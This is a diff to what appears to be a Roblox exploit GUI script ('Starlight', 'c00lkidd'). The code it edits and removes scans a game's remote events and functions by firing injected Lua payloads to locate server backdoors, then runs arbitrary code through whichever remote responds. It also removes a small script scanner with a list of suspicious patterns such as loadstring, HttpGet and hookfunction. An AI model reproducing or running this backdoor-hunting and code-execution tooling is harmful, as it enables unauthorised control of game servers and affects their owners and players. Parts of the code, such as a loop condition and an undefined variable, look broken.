@@ -2198,121 +2198,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	local userInputService = game:GetService("UserInputService")
 	local runService = game:GetService("RunService")
 	local tweenService = game:GetService("TweenService")
-	local HttpService = game:GetService("HttpService")
-	local RunService = game:GetService("RunService")
-	
-	
-	local EXCLUDED_REMOTES = {
-		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
-		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
-		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
-		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
-		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
-		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
-		GetServerVersion = true, GetClientId = true, GetInventory = true,
-		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
-		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
-		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
-		ReportAbuse = true
-	}
-	
-	local SAFE_LOCATIONS = {
-		["CoreGui"] = true,
-		["ServerStorage"] = true,
-		["ReplicatedFirst"] = true,
-		["ServerScriptService"] = true
-	}
-	
-	local foundExploit = false
-	local FinishedFound = false
-	local mode = 3
-	local bg = 1
-	local remoteEvent, remoteFunction
-	local scanTime = 0
-	
-	local function isLikelyBackdoorRemote(remote)
-		local name = remote.Name
-		local parent = remote.Parent
-	
-	
-		if SAFE_LOCATIONS[parent.ClassName] then
-			return false
-		end
-		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
-			print('cancelled remote: '..remote:GetFullName())
-			return false
-		end 
-		if EXCLUDED_REMOTES[name] then
-			return false
-		end
-	
-	
-		return true
-	end
-	
-	local function testRemote(remote, isFunction)
-		if foundExploit then return false end
-		if not isLikelyBackdoorRemote(remote) then return false end
-	
-		local modelName = "starlight_"..tostring(os.clock()):gsub("%.", "")
-		local rs = game:GetService("ReplicatedStorage")
-		local foundEvent = false
-	
-		local connection = rs.DescendantAdded:Connect(function(inst)
-			if inst.Name == modelName then
-				foundEvent = true
-			end
-		end)
-	
-		local function cleanup()
-			connection:Disconnect()
-			local f = rs:FindFirstChild(modelName)
-			if f then f:Destroy() end
-		end
-	
-		local success = pcall(function()
-			local payload = [[
-				local m=Instance.new("Folder")
-				m.Name="]]..modelName..[["
-				m.Parent=game:GetService("ReplicatedStorage")
-			]]
-			if isFunction then
-				remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
-			else
-				remote:FireServer(payload)
-			end
-		end)
-	        local timeout = 1
-		local start = os.clock()
-	while os.clock() do
-		if foundEvent or rs:FindFirstChild(modelName) then
-			foundEvent = true
-			break
-		end
-		if finished then break end
-		task.wait()
-		end
-	
-		cleanup()
-	
-		if foundEvent and not foundExploit then
-			foundExploit = true
-			if isFunction then
-				remoteFunction = remote
-			else
-				remoteEvent = remote
-			end
-			return true
-		end
-	
-		return false
-	end
-	
-	
-	
-	local function findRemote()
-		local trueStart = os.clock()
-		foundExploit = false
+			
         local EXCLUDED_REMOTES = {
 		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
 		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
@@ -2424,7 +2310,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			end
 		end
 	
-		print(string.format("c00lkid: 🔍 scanning %d remotes", #remotes))
+		print(string.format("c00lkidd: 🔍 scanning %d remotes", #remotes))
 	
 		table.sort(remotes, function(a, b)
 			-- sort: sus name/loc first
@@ -2451,7 +2337,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 				end)
 	
 				if ok and result then
-					print("c00lkidd:", remotes[i]:GetFullName())
+					print("c00lkidd: backdoor found:", remotes[i]:GetFullName())
 				end
 	
 				activeTasks -= 1
@@ -2479,8 +2365,8 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		scanTime = os.clock() - trueStart
 		FinishedFound = true
 		print(string.format("c00lkidd: scan completed in %.3f seconds", os.clock() - tStart))
-		end
-	
+	end
+
 	local function fireRemoteEvent(code)
 		if remoteEvent then
 			print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
@@ -2819,65 +2705,3 @@ coroutine.wrap(MMOF_fake_script)()
 coroutine.wrap(OHZSZXY_fake_script)()
 coroutine.wrap(LZLXRPZ_fake_script)()
 coroutine.wrap(QOXL_fake_script)()
-
-
-
--- Optimized Script Scanner
-local scannedObjects = {}
-local suspiciousPatterns = {
-    "require%(", "getfenv", "setfenv", "loadstring", "HttpGet", "FireServer",
-    "FireAllClients", "coroutine%.wrap", "getrenv", "hookfunction", "syn%."
-}
-
-local function isSuspicious(source)
-    for _, pattern in ipairs(suspiciousPatterns) do
-        if source:find(pattern) then
-            return true
-        end
-    end
-    return false
-end
-
-local function scanScripts()
-    local allDescendants = game:GetDescendants()
-    local found = {}
-    for _, obj in ipairs(allDescendants) do
-        if obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
-            if not scannedObjects[obj] then
-                scannedObjects[obj] = true
-                local src
-                pcall(function() src = obj.Source end)
-                if src and isSuspicious(src) then
-                    table.insert(found, {
-                        Name = obj:GetFullName(),
-                        Class = obj.ClassName,
-                        Snippet = src:sub(1, 100)
-                    })
-                end
-            end
-        end
-    end
-
-    if #found > 0 then
-        print("[SCAN RESULTS] Suspicious scripts found:")
-        for _, result in ipairs(found) do
-            print("- " .. result.Name .. " [" .. result.Class .. "]")
-            print("  Snippet: " .. result.Snippet)
-        end
-    else
-        print("[SCAN RESULTS] No suspicious scripts found.")
-    end
-end
-
--- Optional debounce scan
-local debounce = false
-function runScan()
-    if debounce then return end
-    debounce = true
-    scanScripts()
-    wait(5)
-    debounce = false
-end
-
--- Trigger the scan once on load (optional)
--- runScan()
